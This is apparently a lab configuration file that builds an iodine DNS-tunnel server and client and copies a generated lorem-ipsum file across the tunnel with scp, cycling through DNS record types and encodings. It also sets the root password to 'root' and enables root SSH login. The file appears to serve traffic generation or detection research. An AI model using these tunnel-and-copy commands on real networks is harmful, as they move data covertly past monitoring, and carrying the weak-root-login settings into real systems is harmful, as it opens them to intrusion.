dns_attack_server:
    name: iodine_server
    image: ubuntu/focal64
    description: |
      This sets up the IODINE server.
    setup:
        type: shell
        val: |
          echo "Installing IODINE"
          apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y git make build-essential pkg-config zlib1g-dev net-tools openssh-server iputils-ping netcat dnsutils libtext-lorem-perl sshpass
          cd /opt && git clone https://github.com/yarrick/iodine.git
          cd /opt/iodine && make && make install

          echo "Setup SSH Daemon"
          mkdir /var/run/sshd
          echo "root:root" | chpasswd
          sed -ri "s/^#?PermitRootLogin\s+.*/PermitRootLogin yes/" /etc/ssh/sshd_config
          sed -ri "s/UsePAM yes/#UsePAM yes/g" /etc/ssh/sshd_config
          mkdir /root/.ssh

          echo "Setting up testfile"
          cd /root && lorem -p 10000 > test-file

    run:
        type: shell
        val: |
          /usr/sbin/sshd -D
          iodined -4 -c -f 10.0.0.1 example.attack -P "{{ variables.passphrase }}"

dns_attack_client:
    name: iodine_client
    image: ubuntu/focal64
    description: |
      This sets up the IODINE client.
    setup:
      type: shell
      val: |
        echo "Installing IODINE"
        apt-get update && DEBIAN_FRONTEND=noninteractive apt-get install -y git make build-essential pkg-config zlib1g-dev net-tools openssh-server iputils-ping netcat dnsutils libtext-lorem-perl sshpass
        cd /opt && git clone https://github.com/yarrick/iodine.git
        cd /opt/iodine && make && make install
    run:
        type: shell
        val: |
          iodine -4 -f -P "{{ variables.passphrase }}" -T"{{ variables.record_type }}" -O"{{ variables.encoding }}" -r 172.18.0.4 example.attack
          sshpass -p "root" scp -r -oStrictHostKeyChecking=no root@10.0.0.1:test-file /tmp/

    #setup:
    #    type: ansible
    #    val: 'playbook.yaml'
    #run:
    #    type: script
    #    val: 'run.py'

    variables:
        - record_type: ["null", "srv", "cname", "txt", "private", "mx", "a"]
        - encoding: ["raw", "base32", "base64", "base128"]
        - passphrase: ["0xDEADBEEF"]
